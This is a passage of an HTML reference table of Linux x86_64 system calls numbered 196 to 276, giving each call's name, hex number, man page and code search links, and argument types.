href="https://man7.org/linux/man-pages/man2/flistxattr.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*flistxattr">cs/</a></td><td align="center">0xc4</td><td>int fd</td><td>char *list</td><td>size_t size</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">197</td><td>removexattr</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/removexattr.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*removexattr">cs/</a></td><td align="center">0xc5</td><td>const char *path</td><td>const char *name</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">198</td><td>lremovexattr</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/lremovexattr.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*lremovexattr">cs/</a></td><td align="center">0xc6</td><td>const char *path</td><td>const char *name</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">199</td><td>fremovexattr</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/fremovexattr.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*fremovexattr">cs/</a></td><td align="center">0xc7</td><td>int fd</td><td>const char *name</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">200</td><td>tkill</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/tkill.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*tkill">cs/</a></td><td align="center">0xc8</td><td>pid_t pid</td><td>int sig</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">201</td><td>time</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/time.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*time">cs/</a></td><td align="center">0xc9</td><td>time_t *tloc</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">202</td><td>futex</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/futex.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*futex">cs/</a></td><td align="center">0xca</td><td>u32 *uaddr</td><td>int op</td><td>u32 val</td><td>struct __kernel_timespec *utime</td><td>u32 *uaddr2</td><td>u32 val3</td></tr><tr><td align="center">203</td><td>sched_setaffinity</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/sched_setaffinity.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*sched_setaffinity">cs/</a></td><td align="center">0xcb</td><td>pid_t pid</td><td>unsigned int len</td><td>unsigned long *user_mask_ptr</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">204</td><td>sched_getaffinity</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/sched_getaffinity.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*sched_getaffinity">cs/</a></td><td align="center">0xcc</td><td>pid_t pid</td><td>unsigned int len</td><td>unsigned long *user_mask_ptr</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">205</td><td>set_thread_area</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/set_thread_area.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*set_thread_area">cs/</a></td><td align="center">0xcd</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td></tr><tr><td align="center">206</td><td>io_setup</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/io_setup.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*io_setup">cs/</a></td><td align="center">0xce</td><td>unsigned nr_reqs</td><td>aio_context_t *ctx</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">207</td><td>io_destroy</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/io_destroy.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*io_destroy">cs/</a></td><td align="center">0xcf</td><td>aio_context_t ctx</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">208</td><td>io_getevents</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/io_getevents.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*io_getevents">cs/</a></td><td align="center">0xd0</td><td>aio_context_t ctx_id</td><td>long min_nr</td><td>long nr</td><td>struct io_event *events</td><td>struct __kernel_timespec *timeout</td><td>-</td></tr><tr><td align="center">209</td><td>io_submit</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/io_submit.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*io_submit">cs/</a></td><td align="center">0xd1</td><td>aio_context_t</td><td>long</td><td>struct iocb * *</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">210</td><td>io_cancel</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/io_cancel.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*io_cancel">cs/</a></td><td align="center">0xd2</td><td>aio_context_t ctx_id</td><td>struct iocb *iocb</td><td>struct io_event *result</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">211</td><td>get_thread_area</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/get_thread_area.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*get_thread_area">cs/</a></td><td align="center">0xd3</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td></tr><tr><td align="center">212</td><td>lookup_dcookie</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/lookup_dcookie.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*lookup_dcookie">cs/</a></td><td align="center">0xd4</td><td>u64 cookie64</td><td>char *buf</td><td>size_t len</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">213</td><td>epoll_create</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/epoll_create.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*epoll_create">cs/</a></td><td align="center">0xd5</td><td>int size</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">214</td><td>epoll_ctl_old</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/epoll_ctl_old.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*epoll_ctl_old">cs/</a></td><td align="center">0xd6</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td></tr><tr><td align="center">215</td><td>epoll_wait_old</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/epoll_wait_old.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*epoll_wait_old">cs/</a></td><td align="center">0xd7</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td></tr><tr><td align="center">216</td><td>remap_file_pages</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/remap_file_pages.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*remap_file_pages">cs/</a></td><td align="center">0xd8</td><td>unsigned long start</td><td>unsigned long size</td><td>unsigned long prot</td><td>unsigned long pgoff</td><td>unsigned long flags</td><td>-</td></tr><tr><td align="center">217</td><td>getdents64</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/getdents64.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*getdents64">cs/</a></td><td align="center">0xd9</td><td>unsigned int fd</td><td>struct linux_dirent64 *dirent</td><td>unsigned int count</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">218</td><td>set_tid_address</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/set_tid_address.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*set_tid_address">cs/</a></td><td align="center">0xda</td><td>int *tidptr</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">219</td><td>restart_syscall</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/restart_syscall.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*restart_syscall">cs/</a></td><td align="center">0xdb</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">220</td><td>semtimedop</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/semtimedop.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*semtimedop">cs/</a></td><td align="center">0xdc</td><td>int semid</td><td>struct sembuf *sops</td><td>unsigned nsops</td><td>const struct __kernel_timespec *timeout</td><td>-</td><td>-</td></tr><tr><td align="center">221</td><td>fadvise64</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/fadvise64.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*fadvise64">cs/</a></td><td align="center">0xdd</td><td>int fd</td><td>loff_t offset</td><td>size_t len</td><td>int advice</td><td>-</td><td>-</td></tr><tr><td align="center">222</td><td>timer_create</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/timer_create.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*timer_create">cs/</a></td><td align="center">0xde</td><td>clockid_t which_clock</td><td>struct sigevent *timer_event_spec</td><td>timer_t * created_timer_id</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">223</td><td>timer_settime</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/timer_settime.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*timer_settime">cs/</a></td><td align="center">0xdf</td><td>timer_t timer_id</td><td>int flags</td><td>const struct __kernel_itimerspec *new_setting</td><td>struct __kernel_itimerspec *old_setting</td><td>-</td><td>-</td></tr><tr><td align="center">224</td><td>timer_gettime</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/timer_gettime.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*timer_gettime">cs/</a></td><td align="center">0xe0</td><td>timer_t timer_id</td><td>struct __kernel_itimerspec *setting</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">225</td><td>timer_getoverrun</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/timer_getoverrun.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*timer_getoverrun">cs/</a></td><td align="center">0xe1</td><td>timer_t timer_id</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">226</td><td>timer_delete</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/timer_delete.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*timer_delete">cs/</a></td><td align="center">0xe2</td><td>timer_t timer_id</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">227</td><td>clock_settime</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/clock_settime.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*clock_settime">cs/</a></td><td align="center">0xe3</td><td>clockid_t which_clock</td><td>const struct __kernel_timespec *tp</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">228</td><td>clock_gettime</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/clock_gettime.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*clock_gettime">cs/</a></td><td align="center">0xe4</td><td>clockid_t which_clock</td><td>struct __kernel_timespec *tp</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">229</td><td>clock_getres</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/clock_getres.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*clock_getres">cs/</a></td><td align="center">0xe5</td><td>clockid_t which_clock</td><td>struct __kernel_timespec *tp</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">230</td><td>clock_nanosleep</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/clock_nanosleep.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*clock_nanosleep">cs/</a></td><td align="center">0xe6</td><td>clockid_t which_clock</td><td>int flags</td><td>const struct __kernel_timespec *rqtp</td><td>struct __kernel_timespec *rmtp</td><td>-</td><td>-</td></tr><tr><td align="center">231</td><td>exit_group</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/exit_group.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*exit_group">cs/</a></td><td align="center">0xe7</td><td>int error_code</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">232</td><td>epoll_wait</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/epoll_wait.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*epoll_wait">cs/</a></td><td align="center">0xe8</td><td>int epfd</td><td>struct epoll_event *events</td><td>int maxevents</td><td>int timeout</td><td>-</td><td>-</td></tr><tr><td align="center">233</td><td>epoll_ctl</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/epoll_ctl.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*epoll_ctl">cs/</a></td><td align="center">0xe9</td><td>int epfd</td><td>int op</td><td>int fd</td><td>struct epoll_event *event</td><td>-</td><td>-</td></tr><tr><td align="center">234</td><td>tgkill</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/tgkill.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*tgkill">cs/</a></td><td align="center">0xea</td><td>pid_t tgid</td><td>pid_t pid</td><td>int sig</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">235</td><td>utimes</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/utimes.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*utimes">cs/</a></td><td align="center">0xeb</td><td>char *filename</td><td>struct timeval *utimes</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">236</td><td>vserver</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/vserver.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*vserver">cs/</a></td><td align="center">0xec</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td></tr><tr><td align="center">237</td><td>mbind</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/mbind.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*mbind">cs/</a></td><td align="center">0xed</td><td>unsigned long start</td><td>unsigned long len</td><td>unsigned long mode</td><td>const unsigned long *nmask</td><td>unsigned long maxnode</td><td>unsigned flags</td></tr><tr><td align="center">238</td><td>set_mempolicy</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/set_mempolicy.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*set_mempolicy">cs/</a></td><td align="center">0xee</td><td>int mode</td><td>const unsigned long *nmask</td><td>unsigned long maxnode</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">239</td><td>get_mempolicy</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/get_mempolicy.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*get_mempolicy">cs/</a></td><td align="center">0xef</td><td>int *policy</td><td>unsigned long *nmask</td><td>unsigned long maxnode</td><td>unsigned long addr</td><td>unsigned long flags</td><td>-</td></tr><tr><td align="center">240</td><td>mq_open</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/mq_open.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*mq_open">cs/</a></td><td align="center">0xf0</td><td>const char *name</td><td>int oflag</td><td>umode_t mode</td><td>struct mq_attr *attr</td><td>-</td><td>-</td></tr><tr><td align="center">241</td><td>mq_unlink</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/mq_unlink.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*mq_unlink">cs/</a></td><td align="center">0xf1</td><td>const char *name</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">242</td><td>mq_timedsend</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/mq_timedsend.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*mq_timedsend">cs/</a></td><td align="center">0xf2</td><td>mqd_t mqdes</td><td>const char *msg_ptr</td><td>size_t msg_len</td><td>unsigned int msg_prio</td><td>const struct __kernel_timespec *abs_timeout</td><td>-</td></tr><tr><td align="center">243</td><td>mq_timedreceive</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/mq_timedreceive.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*mq_timedreceive">cs/</a></td><td align="center">0xf3</td><td>mqd_t mqdes</td><td>char *msg_ptr</td><td>size_t msg_len</td><td>unsigned int *msg_prio</td><td>const struct __kernel_timespec *abs_timeout</td><td>-</td></tr><tr><td align="center">244</td><td>mq_notify</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/mq_notify.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*mq_notify">cs/</a></td><td align="center">0xf4</td><td>mqd_t mqdes</td><td>const struct sigevent *notification</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">245</td><td>mq_getsetattr</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/mq_getsetattr.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*mq_getsetattr">cs/</a></td><td align="center">0xf5</td><td>mqd_t mqdes</td><td>const struct mq_attr *mqstat</td><td>struct mq_attr *omqstat</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">246</td><td>kexec_load</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/kexec_load.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*kexec_load">cs/</a></td><td align="center">0xf6</td><td>unsigned long entry</td><td>unsigned long nr_segments</td><td>struct kexec_segment *segments</td><td>unsigned long flags</td><td>-</td><td>-</td></tr><tr><td align="center">247</td><td>waitid</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/waitid.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*waitid">cs/</a></td><td align="center">0xf7</td><td>int which</td><td>pid_t pid</td><td>struct siginfo *infop</td><td>int options</td><td>struct rusage *ru</td><td>-</td></tr><tr><td align="center">248</td><td>add_key</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/add_key.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*add_key">cs/</a></td><td align="center">0xf8</td><td>const char *_type</td><td>const char *_description</td><td>const void *_payload</td><td>size_t plen</td><td>key_serial_t destringid</td><td>-</td></tr><tr><td align="center">249</td><td>request_key</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/request_key.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*request_key">cs/</a></td><td align="center">0xf9</td><td>const char *_type</td><td>const char *_description</td><td>const char *_callout_info</td><td>key_serial_t destringid</td><td>-</td><td>-</td></tr><tr><td align="center">250</td><td>keyctl</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/keyctl.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*keyctl">cs/</a></td><td align="center">0xfa</td><td>int cmd</td><td>unsigned long arg2</td><td>unsigned long arg3</td><td>unsigned long arg4</td><td>unsigned long arg5</td><td>-</td></tr><tr><td align="center">251</td><td>ioprio_set</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/ioprio_set.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*ioprio_set">cs/</a></td><td align="center">0xfb</td><td>int which</td><td>int who</td><td>int ioprio</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">252</td><td>ioprio_get</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/ioprio_get.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*ioprio_get">cs/</a></td><td align="center">0xfc</td><td>int which</td><td>int who</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">253</td><td>inotify_init</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/inotify_init.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*inotify_init">cs/</a></td><td align="center">0xfd</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">254</td><td>inotify_add_watch</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/inotify_add_watch.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*inotify_add_watch">cs/</a></td><td align="center">0xfe</td><td>int fd</td><td>const char *path</td><td>u32 mask</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">255</td><td>inotify_rm_watch</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/inotify_rm_watch.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*inotify_rm_watch">cs/</a></td><td align="center">0xff</td><td>int fd</td><td>__s32 wd</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">256</td><td>migrate_pages</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/migrate_pages.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*migrate_pages">cs/</a></td><td align="center">0x100</td><td>pid_t pid</td><td>unsigned long maxnode</td><td>const unsigned long *from</td><td>const unsigned long *to</td><td>-</td><td>-</td></tr><tr><td align="center">257</td><td>openat</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/openat.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*openat">cs/</a></td><td align="center">0x101</td><td>int dfd</td><td>const char *filename</td><td>int flags</td><td>umode_t mode</td><td>-</td><td>-</td></tr><tr><td align="center">258</td><td>mkdirat</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/mkdirat.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*mkdirat">cs/</a></td><td align="center">0x102</td><td>int dfd</td><td>const char * pathname</td><td>umode_t mode</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">259</td><td>mknodat</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/mknodat.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*mknodat">cs/</a></td><td align="center">0x103</td><td>int dfd</td><td>const char * filename</td><td>umode_t mode</td><td>unsigned dev</td><td>-</td><td>-</td></tr><tr><td align="center">260</td><td>fchownat</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/fchownat.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*fchownat">cs/</a></td><td align="center">0x104</td><td>int dfd</td><td>const char *filename</td><td>uid_t user</td><td>gid_t group</td><td>int flag</td><td>-</td></tr><tr><td align="center">261</td><td>futimesat</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/futimesat.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*futimesat">cs/</a></td><td align="center">0x105</td><td>int dfd</td><td>const char *filename</td><td>struct timeval *utimes</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">262</td><td>newfstatat</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/newfstatat.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*newfstatat">cs/</a></td><td align="center">0x106</td><td>int dfd</td><td>const char *filename</td><td>struct stat *statbuf</td><td>int flag</td><td>-</td><td>-</td></tr><tr><td align="center">263</td><td>unlinkat</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/unlinkat.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*unlinkat">cs/</a></td><td align="center">0x107</td><td>int dfd</td><td>const char * pathname</td><td>int flag</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">264</td><td>renameat</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/renameat.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*renameat">cs/</a></td><td align="center">0x108</td><td>int olddfd</td><td>const char * oldname</td><td>int newdfd</td><td>const char * newname</td><td>-</td><td>-</td></tr><tr><td align="center">265</td><td>linkat</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/linkat.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*linkat">cs/</a></td><td align="center">0x109</td><td>int olddfd</td><td>const char *oldname</td><td>int newdfd</td><td>const char *newname</td><td>int flags</td><td>-</td></tr><tr><td align="center">266</td><td>symlinkat</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/symlinkat.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*symlinkat">cs/</a></td><td align="center">0x10a</td><td>const char * oldname</td><td>int newdfd</td><td>const char * newname</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">267</td><td>readlinkat</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/readlinkat.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*readlinkat">cs/</a></td><td align="center">0x10b</td><td>int dfd</td><td>const char *path</td><td>char *buf</td><td>int bufsiz</td><td>-</td><td>-</td></tr><tr><td align="center">268</td><td>fchmodat</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/fchmodat.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*fchmodat">cs/</a></td><td align="center">0x10c</td><td>int dfd</td><td>const char * filename</td><td>umode_t mode</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">269</td><td>faccessat</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/faccessat.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*faccessat">cs/</a></td><td align="center">0x10d</td><td>int dfd</td><td>const char *filename</td><td>int mode</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">270</td><td>pselect6</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/pselect6.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*pselect6">cs/</a></td><td align="center">0x10e</td><td>int</td><td>fd_set *</td><td>fd_set *</td><td>fd_set *</td><td>struct __kernel_timespec *</td><td>void *</td></tr><tr><td align="center">271</td><td>ppoll</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/ppoll.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*ppoll">cs/</a></td><td align="center">0x10f</td><td>struct pollfd *</td><td>unsigned int</td><td>struct __kernel_timespec *</td><td>const sigset_t *</td><td>size_t</td><td>-</td></tr><tr><td align="center">272</td><td>unshare</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/unshare.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*unshare">cs/</a></td><td align="center">0x110</td><td>unsigned long unshare_flags</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">273</td><td>set_robust_list</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/set_robust_list.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*set_robust_list">cs/</a></td><td align="center">0x111</td><td>struct robust_list_head *head</td><td>size_t len</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">274</td><td>get_robust_list</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/get_robust_list.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*get_robust_list">cs/</a></td><td align="center">0x112</td><td>int pid</td><td>struct robust_list_head * *head_ptr</td><td>size_t *len_ptr</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">275</td><td>splice</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/splice.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*splice">cs/</a></td><td align="center">0x113</td><td>int fd_in</td><td>loff_t *off_in</td><td>int fd_out</td><td>loff_t *off_out</td><td>size_t len</td><td>unsigned int flags</td></tr><tr><td align="center">276</td><td>tee</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/tee.2.html">man/</a> <a 